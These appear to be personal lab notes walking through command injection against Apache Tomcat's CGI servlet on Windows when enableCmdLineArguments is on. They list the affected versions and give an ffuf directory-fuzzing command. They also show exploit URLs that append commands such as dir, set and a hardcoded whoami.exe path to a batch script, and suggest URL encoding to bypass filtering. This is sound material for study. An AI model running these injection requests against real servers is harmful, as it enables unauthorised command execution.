This vulnerability affects Windows systems that have the `enableCmdLineArguments` feature enabled. 
Versions 9.0.0.M1 to 9.0.17, 8.5.0 to 8.5.39, and 7.0.0 to 7.0.93 of Tomcat are affected.

# Enumeration
1. nmap scan
2. Apache Tomcat/9.0.17 running on port 8080
3. After validation, we try to find a CGI script
# Finding a CGI script
```
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
```
Example: `welcome.bat` is discovered
# Exploitation
```
http://10.129.204.227:8080/cgi/welcome.bat?&dir
```
1. Navigating to the above URL returns the output for the dir batch command, however trying to run other common windows command line apps, such as whoami doesn't return an output.
2. Retrieve a list of environmental variables
```
http://10.129.204.227:8080/cgi/welcome.bat?&set
```
3. From the list, we can see that the PATH variable has been unset, so we will need to hardcode paths in requests:
	1. http://10.129.204.227:8080/cgi/welcome.bat?&c:\\windows\\system32\\whoami.exe
	2. The above might not work, so we can bypass the filter by URL encoding